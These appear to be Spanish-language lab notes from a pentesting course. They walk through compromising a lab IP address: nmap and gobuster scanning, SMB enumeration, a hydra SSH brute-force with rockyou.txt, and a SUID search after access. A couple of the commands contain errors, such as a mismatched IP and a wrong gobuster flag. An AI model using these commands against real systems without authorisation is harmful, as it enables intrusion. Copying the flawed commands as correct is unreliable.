Tenemos una ip publica que tenemos que comprometer -> 35.205.200.250

*1 -> Haremos un escaneo pasivo:*

Para saber si es windows o linux (no tiene porque ser definitivo) y saber si esta levantada:
```bash
ping 35.205.200.250
```
![[Pasted image 20240910172654.png]]

```bash
whois 35.205.200.205
```

Al no ser un dominio, no te reportaría gran info *nslookup* ni *dnsrecon* :
```bash
nslookup 35.205.200.250

dnsrecon -d 35.205.200.250
```

Podríamos probar para ver si tiene algún tipo de certificado con *openssl* pero al no ser un dominio nos va a ocurrir lo mismo :
```bash
openssl s_client -connect 35.205.200.250
```


*2 -> Haremos un escaneo activo:*
```bash
gobuster dir -w http://35.205.200.250 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 100
```

![[Pasted image 20240910173119.png]]
Ahí te da pistas (como en el *laboratorio2*)

Para saber solo los puertos que están abiertos:
```bash
sudo nmap 35.205.200.250 -n -Pn -sS --min-rate 5000
```
Para lanzar los scripts por defecto:
```bash
nmap 35.205.200.250 -Pn -n -sVC --min-rate 5000
```
Elegimos la vulnerabilidad que más nos interese (en este caso smb):
```bash
nmap 35.205.200.250 -p139,445 -n -Pn -sV --script=*smb-*
```

No hay que depender de una sola herramienta, así que enumeraremos lo que tengamos en smb ->*smbmap* / *crackmapexec* /*smbclient* / *enum4linux* :
```bash
crackmapexec smb 35.205.200.250 -u "" -p ""
```
```bash
smbmap -H 35.205.200.250
```

Muchas veces que por *anonymous* puedes acceder :
```bash
smbclient //35.205.200.250
```
![[Pasted image 20240910180606.png]]

Esta herrmamienta te reporta muchas cosas:
```bash
enum4linux 35.205.200.250
```


*3-> Explotacion vulnerabilidad* -> Según el vector de ataque. En este caso haremos fuerza bruta (conocemos usuarios):
```bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://35.205.200.250
```
-P : lista de contraseña
-p : una sola contraseña

*Ya estamos dentro del servidor !!*
```bash
find / -type f -perm -4000 2>/dev/null
```

-> AQUI SEGUIMOS EL LABORATORIO2, el mismo vector de ataque

*Cuando levantamos servidor con python, a veces si intentamos conectarnos por puerto 80, 8080,446 no vamos a poder por tener permisos privilegiado. Por defecto se conecta por el 8000. Cuando tenemos este error probar por otro puerto estilo 4444*

Mejor utilizar clave publica para acceder a servidor mejor utilizar *ssh-copy-id* , asi no hay peligro de robar la clave pública.

Para ver manual de *ssh-copy-id* (esto es para no estrar en el .ssh):
```bash
curl cht.sh/ssh-copy-id -h
```

![[Pasted image 20240910171013.png]]

Te lo pone por consola más limpio que un man o help:
```bash
ssh-copy-id -h
```

![[Pasted image 20240910171124.png]]
